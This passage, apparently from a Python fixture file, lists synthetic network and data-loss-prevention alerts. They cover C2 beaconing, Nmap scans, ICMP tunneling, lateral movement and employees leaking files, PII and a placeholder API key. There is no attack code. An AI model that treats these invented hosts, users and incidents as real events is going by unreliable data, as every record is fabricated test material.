            {"type": "query_domain", "value": "e9a6f2b5d0c7.malwaredomain.net"},
            {"type": "threat_type", "value": "DGA C2"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:35:54.666Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.1.101",
            "query": "e9a6f2b5d0c7.malwaredomain.net"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-20-Internal-Reconnaissance-Nmap-Activity",
        "rule_name": "Internal reconnaissance (Nmap activity)",
        "alert_date": "2025-09-24T10:40:40Z",
        "tags": ["reconnaissance", "nmap", "lateral-movement"],
        "severity": "High",
        "reference": "Host 192.168.2.50 performing Nmap scan",
        "description": "Traffic pattern from host 192.168.2.50 matches Nmap scan signatures—indicating active internal reconnaissance.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "tool_name", "value": "Nmap"},
            {"type": "scan_pattern", "value": "SYN, FIN, XMAS flags"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:40:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ips": "192.168.2.0/24",
            "tcp_flags": "SYN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-21-ICMP-Tunneling",
        "rule_name": "ICMP tunneling communication",
        "alert_date": "2025-09-24T10:45:15Z",
        "tags": ["icmptunnel", "c2", "exfiltration"],
        "severity": "High",
        "reference": "Host 192.168.3.88 engaged in ICMP tunneling",
        "description": "Host 192.168.3.88 sent numerous ICMP echo requests with abnormal payload sizes—possible covert C2 or exfiltration via ICMP tunneling.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "destination_ip", "value": "203.0.113.50"},
            {"type": "protocol", "value": "ICMP"},
            {"type": "payload_size", "value": "unusual"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T10:45:14.543Z",
            "event_type": "ICMPFlow",
            "src_ip": "192.168.3.88",
            "dst_ip": "203.0.113.50",
            "icmp_type": "echo-request",
            "icmp_payload_length": 1024
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-22-IoT-Device-Unusual-Traffic",
        "rule_name": "IoT device unusual traffic",
        "alert_date": "2025-09-24T10:50:00Z",
        "tags": ["iot", "anomaly", "botnet"],
        "severity": "High",
        "reference": "Smart printer initiated external connections",
        "description": "Smart printer (192.168.5.10), normally internal-only, suddenly generated high-volume outbound connections to external IP 198.51.100.100—suggesting compromise and botnet participation.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.5.10"},
            {"type": "destination_ip", "value": "198.51.100.100"},
            {"type": "device_type", "value": "Printer"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-05",
            "timestamp": "2025-09-24T10:49:59.000Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.5.10",
            "dst_ip": "198.51.100.100",
            "dst_port": 80
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-23-Lateral-Movement-Failed-Logins",
        "rule_name": "Lateral movement failed login attempts",
        "alert_date": "2025-09-24T10:55:30Z",
        "tags": ["lateral-movement", "authentication", "brute-force"],
        "severity": "Medium",
        "reference": "Host 192.168.2.50 made failed SSH logins to multiple servers",
        "description": "Host 192.168.2.50 generated many failed SSH login attempts against multiple Linux servers in a short window—common lateral movement brute-force behavior.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "protocol", "value": "SSH (22)"},
            {"type": "failed_logins", "value": 20},
            {"type": "target_count", "value": 5}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:55:29.876Z",
            "event_type": "AuthenticationFailure",
            "client_ip": "192.168.2.50",
            "server_ip": "192.168.2.10, 192.168.2.11,...",
            "service": "SSH"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-24-VPN-Traffic-to-Unusual-Endpoint",
        "rule_name": "VPN traffic to unusual endpoint",
        "alert_date": "2025-09-24T11:00:15Z",
        "tags": ["vpn", "policy-violation", "circumvention"],
        "severity": "Low",
        "reference": "Host 192.168.1.101 connected to personal VPN service",
        "description": "Host 192.168.1.101 communicated with an IP belonging to a known personal VPN provider, potentially to circumvent security controls.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "104.16.200.100"},
            {"type": "destination_provider", "value": "NordVPN"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T11:00:14.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "104.16.200.100",
            "dst_port": 1194,
            "app_protocol": "OpenVPN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-25-Outbound-SMB-to-External-IP",
        "rule_name": "Outbound SMB connection to external IP",
        "alert_date": "2025-09-24T11:05:00Z",
        "tags": ["lateral-movement", "outbound", "data-exfiltration"],
        "severity": "High",
        "reference": "Host 192.168.2.50 attempted SMB connection to external IP",
        "description": "Host 192.168.2.50 attempted an outbound SMB (445) connection to external IP 203.0.113.100. SMB should not egress to the internet—possible data exfiltration or malware activity.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "203.0.113.100"},
            {"type": "protocol", "value": "SMB (445)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T11:04:59.000Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "203.0.113.100",
            "dst_port": 445
        }
    }
]

ndr_alert.extend([
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "Suspicious command and control (C2) communication",
        "alert_date": "2025-09-18T13:35:10Z",
        "tags": ["c2", "cobaltstrike", "network"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 communicated with known C2 server",
        "description": "Detected host FIN-WKS-JDOE-05 initiating outbound connection to malicious C2 server IP 198.51.100.50. Traffic pattern closely matches Cobalt Strike Beacon profile.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_port", "value": "443"},
            {"type": "protocol", "value": "HTTPS"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T13:35:09.800Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "source_port": 51234,
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "protocol": "TCP",
                "bytes_in": 1024,
                "bytes_out": 512,
                "duration_seconds": 5
            },
            "network_context": {
                "destination_domain": "known-bad.c2.server",
                "threat_intel": {"source": "threat-feed-X", "match": "Cobalt Strike C2 server"}
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "Host-to-host lateral movement attempt",
        "alert_date": "2025-09-18T14:12:00Z",
        "tags": ["lateral-movement", "internal-scan"],
        "severity": "High",
        "reference": "Host FIN-WKS-JDOE-05 initiated anomalous connections to domain controller SRV-DC-01",
        "description": "Detected FIN-WKS-JDOE-05 (workstation) initiating high volume SMB and LDAP connections to domain controller SRV-DC-01—deviates from normal user behavior, indicating potential lateral movement or reconnaissance.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "10.10.1.5"},
            {"type": "destination_hostname", "value": "SRV-DC-01"},
            {"type": "protocol", "value": "SMB", "port": 445},
            {"type": "protocol", "value": "LDAP", "port": 389}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T14:11:59.550Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "destination_ip": "10.10.1.5",
                "destination_port": [445, 389],
                "protocol": ["SMB", "LDAP"],
                "flow_count": 25,
                "flow_rate_per_sec": 5
            },
            "network_context": {
                "source_device_type": "workstation",
                "destination_device_type": "domain-controller",
                "behavior_anomaly": "Unusual high-volume SMB/LDAP traffic from a workstation to a DC"
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-15-Unauthorized-Data-Exfiltration",
        "rule_name": "Abnormal data exfiltration",
        "alert_date": "2025-09-18T14:18:30Z",
        "tags": ["exfiltration", "data-transfer", "unusual-port"],
        "severity": "High",
        "reference": "Host SRV-DC-01 transferring abnormal data volume to external IP",
        "description": "Domain controller SRV-DC-01 is sending large encrypted data volumes over non-standard port (44443) to external IP 203.0.113.78—pattern commonly associated with data exfiltration.",
        "artifact": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "destination_ip", "value": "203.0.113.78"},
            {"type": "destination_port", "value": "44443"},
            {"type": "data_volume", "value": "1.2 GB"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-dc",
            "timestamp": "2025-09-18T14:18:29.112Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "10.10.1.5",
                "destination_ip": "203.0.113.78",
                "destination_port": 44443,
                "protocol": "TCP",
                "bytes_out": 1200000000,
                "duration_seconds": 180
            },
            "network_context": {
                "flow_direction": "outbound",
                "behavior_anomaly": "Large volume of data transfer on an unusual port to an external host"
            },
            "device_details": {"hostname": "SRV-DC-01"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "Suspicious command and control (C2) communication",
        "alert_date": "2025-09-19T09:20:15Z",
        "tags": ["c2", "metasploit", "network"],
        "severity": "Critical",
        "reference": "Host FIN-SRV-ACCT-03 communicated with known C2 server",
        "description": "Detected host FIN-SRV-ACCT-03 initiating outbound connection to malicious C2 server IP 198.51.100.60. Traffic pattern closely matches Metasploit payload profile.",
        "artifact": [
            {"type": "hostname", "value": "FIN-SRV-ACCT-03"},
            {"type": "source_ip", "value": "192.168.2.55"},
            {"type": "destination_ip", "value": "198.51.100.60"},
            {"type": "destination_domain", "value": "metasploit.c2.server"},
            {"type": "destination_port", "value": "8080"},
            {"type": "protocol", "value": "HTTP"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-19T09:20:14.500Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.2.55",
                "source_port": 61123,
                "destination_ip": "198.51.100.60",
                "destination_port": 8080,
                "protocol": "TCP",
                "bytes_in": 789,
                "bytes_out": 456,
                "duration_seconds": 8
            },
            "network_context": {
                "destination_domain": "metasploit.c2.server",
                "threat_intel": {"source": "threat-feed-Y", "match": "Metasploit C2 server"}
            },
            "device_details": {"hostname": "FIN-SRV-ACCT-03"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "Host-to-host lateral movement attempt",
        "alert_date": "2025-09-19T10:05:45Z",
        "tags": ["lateral-movement", "reconnaissance"],
        "severity": "High",
        "reference": "Host FIN-SRV-ACCT-03 initiated anomalous connections to FIN-WKS-JDOE-05",
        "description": "Detected FIN-SRV-ACCT-03 (finance server) initiating anomalous number of RDP connections to FIN-WKS-JDOE-05—deviation from normal server behavior, suggesting reconnaissance or lateral movement post credential theft.",
        "artifact": [
            {"type": "hostname", "value": "FIN-SRV-ACCT-03"},
            {"type": "source_ip", "value": "192.168.2.55"},
            {"type": "destination_ip", "value": "192.168.1.101"},
            {"type": "destination_hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "protocol", "value": "RDP", "port": 3389}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-19T10:05:44.880Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "192.168.2.55",
                "destination_ip": "192.168.1.101",
                "destination_port": [3389],
                "protocol": ["RDP"],
                "flow_count": 15,
                "flow_rate_per_sec": 3
            },
            "network_context": {
                "source_device_type": "server",
                "destination_device_type": "workstation",
                "behavior_anomaly": "Unusual RDP traffic from a server to a workstation"
            },
            "device_details": {"hostname": "FIN-SRV-ACCT-03"}
        }
    }
])

dlp_alert = [
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-08-Financial-Record-Transfer-to-USB",
        "rule_name": "Financial records copied to removable device",
        "alert_date": "2025-09-18T15:25:55Z",
        "tags": ["finance", "exfiltration", "usb"],
        "severity": "High",
        "reference": "User j.doe copied corporate financial report to USB drive",
        "description": "Detected user j.doe copying an Excel file containing quarterly corporate financial data to a removable storage device attached to FIN-WKS-JDOE-05.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "file-copy-to-usb"},
            {"type": "data_classification", "value": "Financial"},
            {"type": "file_name", "value": "Q3_Financial_Report.xlsx"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:25:54.660Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Removable Media",
            "file_details": {
                "file_path": "C:\\Users\\j.doe\\Documents\\Reports\\Q3_Financial_Report.xlsx",
                "file_hash_sha256": "c3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "classification_tags": ["Financial", "Confidential"]
            },
            "transfer_details": {
                "device_type": "USB-Drive",
                "device_serial": "A1B2C3D4E5F6"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-09-Source-Code-Upload-to-Pastebin",
        "rule_name": "Source code uploaded to public site",
        "alert_date": "2025-09-18T15:30:15Z",
        "tags": ["source-code", "exfiltration", "web"],
        "severity": "Critical",
        "reference": "R&D employee posted source code to public site",
        "description": "Detected an R&D user attempting to upload a text snippet containing proprietary source code to pastebin.com—serious data exfiltration risk.",
        "artifact": [
            {"type": "username", "value": "d.chen"},
            {"type": "hostname", "value": "DEV-WKS-DCHEN-12"},
            {"type": "ip", "value": "10.10.3.25"},
            {"type": "action", "value": "web-upload"},
            {"type": "data_classification", "value": "Proprietary Source Code"},
            {"type": "destination_domain", "value": "pastebin.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev12",
            "timestamp": "2025-09-18T15:30:14.981Z",
            "event_type": "DataTransfer",
            "data_source": "Clipboard",
            "data_destination": "Web",
            "data_details": {
                "extracted_content_hash": "e1f2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2",
                "classification_tags": ["Proprietary Code", "Project-Nova"]
            },
            "transfer_details": {
                "application": "chrome.exe",
                "url": "https://pastebin.com/post"
            },
            "user_details": {"username": "d.chen", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-DCHEN-12", "ip_address": "10.10.3.25"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-10-Health-Information-Transfer",
        "rule_name": "Protected health information (PHI) transfer",
        "alert_date": "2025-09-18T15:35:40Z",
        "tags": ["phi", "healthcare", "exfiltration"],
        "severity": "High",
        "reference": "HR staff attempted to send employee health data externally",
        "description": "HR user h.lin attempted to email a file containing employee protected health information (PHI) to an external recipient.",
        "artifact": [
            {"type": "username", "value": "h.lin"},
            {"type": "hostname", "value": "HR-WKS-HLIN-03"},
            {"type": "ip", "value": "192.168.4.15"},
            {"type": "action", "value": "email-send"},
            {"type": "data_classification", "value": "PHI"},
            {"type": "file_name", "value": "Employee_Health_Data.csv"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-hr03",
            "timestamp": "2025-09-18T15:35:39.145Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "External Email",
            "file_details": {
                "file_path": "C:\\Users\\h.lin\\Documents\\Employee_Health_Data.csv",
                "file_hash_sha256": "f3d4c5b6a7e8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1e2d3f4",
                "classification_tags": ["PHI", "HIPAA-Compliance"]
            },
            "transfer_details": {
                "protocol": "SMTP",
                "recipient": "external.clinic@example.com",
                "subject": "Staff Health Records"
            },
            "user_details": {"username": "h.lin", "domain": "MYCORP"},
            "device_details": {"hostname": "HR-WKS-HLIN-03", "ip_address": "192.168.4.15"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-11-Leaked-API-Key-in-Code",
        "rule_name": "API key leakage",
        "alert_date": "2025-09-18T15:40:00Z",
        "tags": ["api-key", "secrets", "source-code"],
        "severity": "High",
        "reference": "Hardcoded API key found in git push",
        "description": "Detected user m.li committing code containing a hardcoded sensitive API key—may enable unauthorized access to company services.",
        "artifact": [
            {"type": "username", "value": "m.li"},
            {"type": "hostname", "value": "DEV-WKS-MLI-08"},
            {"type": "ip", "value": "10.10.3.18"},
            {"type": "action", "value": "code-commit"},
            {"type": "data_classification", "value": "Secrets"},
            {"type": "repository", "value": "git.mycorp.com/backend-service"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev08",
            "timestamp": "2025-09-18T15:39:59.810Z",
            "event_type": "CodeCommit",
            "application": "git.exe",
            "data_details": {
                "extracted_content": "API_KEY = \"sk_live_abcdefg123456789\"",
                "classification_tags": ["API-Key", "Hardcoded-Secrets"]
            },
            "commit_details": {
                "repo_url": "git.mycorp.com/backend-service",
                "commit_hash": "9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c"
            },
            "user_details": {"username": "m.li", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-MLI-08", "ip_address": "10.10.3.18"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-12-Internal-SSN-Transfer",
        "rule_name": "Internal Social Security Number (SSN) transfer",
        "alert_date": "2025-09-18T15:45:20Z",
        "tags": ["pii", "ssn", "internal-communication"],
        "severity": "Medium",
        "reference": "User j.doe sent SSNs via internal email",
        "description": "User j.doe sent an internal email containing a list of multiple employee Social Security Numbers—violates data protection policy.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "internal-email"},
            {"type": "data_classification", "value": "PII-SSN"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:45:19.456Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "Internal Email",
            "data_details": {
                "extracted_content_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["PII", "SSN"]
            },
            "transfer_details": {
                "protocol": "MAPI",
                "recipient": "k.smith@mycorp.com",
                "subject": "Payroll Details"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-13-Schema-Definition-Download",
        "rule_name": "Sensitive database schema download",
        "alert_date": "2025-09-18T15:50:35Z",
        "tags": ["database-schema", "exfiltration"],
        "severity": "High",
        "reference": "User c.jones downloaded sensitive database schema",
        "description": "User c.jones downloaded a database schema file from production containing sensitive table structures and field definitions—could aid future attacks or data theft.",
        "artifact": [
            {"type": "username", "value": "c.jones"},
            {"type": "hostname", "value": "DBA-WKS-CJONES-07"},
            {"type": "ip", "value": "10.10.4.8"},
            {"type": "action", "value": "file-download"},
            {"type": "data_classification", "value": "Database Schema"},
            {"type": "file_name", "value": "prod_db_schema.sql"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dba07",
            "timestamp": "2025-09-18T15:50:34.777Z",
            "event_type": "DataTransfer",
            "data_source": "MSSQL-Server",
            "data_destination": "Local File System",
            "file_details": {
                "file_path": "C:\\Users\\c.jones\\Downloads\\prod_db_schema.sql",
                "file_hash_sha256": "f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0d1e2f3c4b5a6f7e8d9c0b1a2",
                "classification_tags": ["Database-Schema", "Internal-Only"]
            },
            "transfer_details": {
                "application": "sqlclient.exe",
                "server_ip": "10.10.5.10"
            },
            "user_details": {"username": "c.jones", "domain": "MYCORP"},
            "device_details": {"hostname": "DBA-WKS-CJONES-07", "ip_address": "10.10.4.8"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-14-Encrypted-File-Upload",
        "rule_name": "Encrypted file suspicious upload",
        "alert_date": "2025-09-18T15:55:12Z",
        "tags": ["encrypted-data", "exfiltration", "cloud-storage"],
        "severity": "High",
        "reference": "User a.smith uploaded encrypted archive to cloud service",
        "description": "Detected user a.smith uploading an encrypted compressed (ZIP) file to an unauthorized cloud service. Contents could not be inspected—potential DLP evasion.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "action", "value": "file-upload"},
            {"type": "file_name", "value": "project_data.zip.enc"},
            {"type": "destination_service", "value": "Google Drive"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T15:55:11.901Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Cloud Storage",
            "file_details": {
                "file_path": "C:\\Users\\a.smith\\Desktop\\project_data.zip.enc",
                "file_hash_sha256": "c3e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4",
                "classification_tags": ["Encrypted", "Uncategorized"]
            },
            "transfer_details": {
                "application": "GoogleDriveFS.exe",
                "file_size_mb": 150
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-15-Credit-Card-Number-Clipboard",
        "rule_name": "Credit card number copied to clipboard",
        "alert_date": "2025-09-18T16:00:25Z",
        "tags": ["pci", "credit-card", "clipboard"],
        "severity": "Low",
        "reference": "User j.doe copied credit card info from browser",
        "description": "Detected user j.doe copying a credit card number from a browser page to the clipboard. Not yet exfiltrated but presents potential risk.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "clipboard-copy"},
            {"type": "data_classification", "value": "PCI"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T16:00:24.555Z",
            "event_type": "DataTransfer",
            "data_source": "Chrome Browser",
            "data_destination": "Clipboard",
            "data_details": {
                "extracted_content_hash": "d1e2f3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2",
                "classification_tags": ["Credit Card", "PCI"]
            },
            "transfer_details": {
                "application": "chrome.exe",
                "source_url": "https://internal.payment.portal.com"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-16-CAD-Drawing-Print",
        "rule_name": "Technical drawing printed",
        "alert_date": "2025-09-18T16:05:00Z",
        "tags": ["intellectual-property", "cad", "print"],
        "severity": "High",
        "reference": "R&D employee d.chen printed engineering drawing",
        "description": "Detected user d.chen printing a technical (CAD) drawing containing company intellectual property to a non-designated printer.",
        "artifact": [
            {"type": "username", "value": "d.chen"},
            {"type": "hostname", "value": "DEV-WKS-DCHEN-12"},
            {"type": "action", "value": "print"},
            {"type": "data_classification", "value": "Intellectual Property"},
            {"type": "file_name", "value": "New_Product_Design_V2.dwg"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev12",
            "timestamp": "2025-09-18T16:04:59.666Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Printer",
            "file_details": {
                "file_path": "C:\\Users\\d.chen\\Documents\\CAD\\New_Product_Design_V2.dwg",
                "file_hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["CAD", "Design", "Proprietary"]
            },
            "transfer_details": {
                "printer_name": "\\\\CORP-PRN-05\\HR-Printer"
            },
            "user_details": {"username": "d.chen", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-DCHEN-12", "ip_address": "10.10.3.25"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-17-Sensitive-Data-in-Email-Subject",
        "rule_name": "Sensitive data in email subject",
        "alert_date": "2025-09-18T16:10:15Z",
        "tags": ["pii", "email"],
        "severity": "Low",
        "reference": "User j.doe included SSN in email subject",
        "description": "User j.doe sent an internal email with a sensitive Social Security Number (SSN) included in the subject line.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "internal-email"},
            {"type": "data_classification", "value": "PII-SSN"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T16:10:14.333Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "Internal Email",
            "transfer_details": {
                "protocol": "MAPI",
                "subject": "Payroll processing - Employee SSN: 123-45-6789",
                "recipient": "k.smith@mycorp.com"
            },
            "data_match": {
                "pattern": "Social Security Number",
                "field": "subject"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-18-Unauthorized-Database-Query-Result",
        "rule_name": "Unauthorized database query result",
        "alert_date": "2025-09-18T16:15:30Z",
        "tags": ["database-query", "pii", "exfiltration"],
        "severity": "High",
        "reference": "User c.jones executed large-scale customer data query",
        "description": "User c.jones executed a database query returning large volumes of customer data and exported the results—query included sensitive fields beyond normal job scope.",
        "artifact": [
            {"type": "username", "value": "c.jones"},
            {"type": "hostname", "value": "DBA-WKS-CJONES-07"},
            {"type": "action", "value": "database-query-export"},
            {"type": "data_classification", "value": "PII-Customer"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dba07",
            "timestamp": "2025-09-18T16:15:29.876Z",
            "event_type": "DataTransfer",
            "data_source": "MSSQL-Server",
            "data_destination": "Local File System",
            "transfer_details": {
                "application": "sqlclient.exe",
                "query": "SELECT * FROM Customers.PersonalDetails",
                "rows_exported": 50000
            },
            "data_match": {
                "pattern": "PII-Customer",
                "match_count": 50000
            },
            "user_details": {"username": "c.jones", "domain": "MYCORP"},
            "device_details": {"hostname": "DBA-WKS-CJONES-07", "ip_address": "10.10.4.8"}
        }
    }, {
        "source": "DLP",
        "rule_id": "DLP-Rule-03-Confidential-Document-Exfiltration",
        "rule_name": "Confidential document exfiltration",
        "alert_date": "2025-09-18T15:05:30Z",
        "tags": ["confidential-data", "exfiltration", "email"],
        "severity": "High",
        "reference": "User j.doe attempted to send project plan via personal email",
        "description": "Detected user j.doe attempting to send a file titled '2025 Strategic Project Plan' via personal email (johndoe.private@gmail.com). File classified as Confidential by DLP.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "action", "value": "email-send"},
            {"type": "data_classification", "value": "Confidential"},
            {"type": "file_name", "value": "2025_Strategic_Plan.docx"},
            {"type": "destination_email", "value": "johndoe.private@gmail.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:05:29.876Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "External Email",
            "file_details": {
                "file_path": "C:\\Users\\j.doe\\Documents\\Projects\\2025_Strategic_Plan.docx",
                "file_hash_sha256": "f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "classification_tags": ["Confidential", "Project-Chimera"]
            },
            "transfer_details": {
                "protocol": "SMTP",
                "recipient": "johndoe.private@gmail.com",
                "subject": "FYI - 2025 Plan"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-05-PII-Upload-to-Cloud",
        "rule_name": "Sensitive personal information uploaded to unauthorized cloud service",
        "alert_date": "2025-09-18T15:15:10Z",
        "tags": ["pii", "cloud-storage", "exfiltration"],
        "severity": "Medium",
        "reference": "Marketing employee a.smith uploaded customer list to Dropbox",
        "description": "User a.smith uploaded a spreadsheet containing extensive customer personally identifiable information (PII) to an unauthorized cloud storage service (Dropbox)—policy violation.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "action", "value": "file-upload"},
            {"type": "data_classification", "value": "PII"},
            {"type": "file_name", "value": "Q3_Customer_Leads.xlsx"},
            {"type": "destination_service", "value": "Dropbox"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
